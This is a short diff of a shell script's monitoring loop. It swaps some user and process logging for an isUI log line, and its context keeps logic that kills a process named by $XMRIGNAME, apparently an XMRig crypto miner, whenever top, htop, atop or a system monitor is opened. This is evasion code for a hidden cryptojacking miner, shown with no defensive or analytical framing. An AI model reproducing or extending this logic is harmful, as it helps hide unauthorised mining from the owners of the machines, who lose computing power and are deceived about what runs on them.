@@ -60,14 +60,8 @@ main() {
 	while true; do 
 		sleep 1
 
-		me=$(whoami)
-		myproc=$(ps -a)
-		whoresult=$(who)
-
-		log_message "$me"
-		log_message "$myproc"
-		log_message "$whoresult"
-
+		log_message "isUi=$isUI"
+		
 		if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "mate-system-mon"; then
 			pkill $XMRIGNAME
 			continue
